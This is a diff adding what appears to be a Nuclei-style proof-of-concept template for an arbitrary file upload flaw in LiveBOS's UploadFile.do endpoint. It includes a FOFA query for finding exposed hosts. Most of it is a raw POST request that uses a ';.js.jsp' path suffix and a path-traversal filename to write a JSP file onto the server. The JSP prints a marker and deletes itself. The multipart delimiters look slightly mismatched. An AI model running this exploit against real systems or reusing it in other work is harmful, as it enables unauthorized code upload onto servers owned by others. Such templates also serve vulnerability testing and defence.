@@ -1,0 +1,19 @@
+id: poc-adu7mxoa647n3dh9
+info:
+  name: LiveBOS UploadFile.do 任意文件上传漏洞复现
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/adu7mxoa647n3dh9'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: adu7mxoa647n3dh9
+    fofa: body="Power by LiveBOS"
+http:
+- raw:
+  - "POST /feed/UploadFile.do;.js.jsp HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryxegqoxxi\nConnection: close\n---WebKitFormBoundaryxegqoxxi\nContent-Disposition:form-data; name=\"file\"; filename=\"/../../../../rce.jsp\"\nContent-Type: image/jpeg\n<%@ page import=\"java.io.File\" %>\n<%\n out.println(\"pppppppppoooooooocccccccccccc\");\n String filePath = application.getRealPath(request.getServletPath());\n new File(filePath).delete();\n%>\n---WebKitFormBoundaryxegqoxxi--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
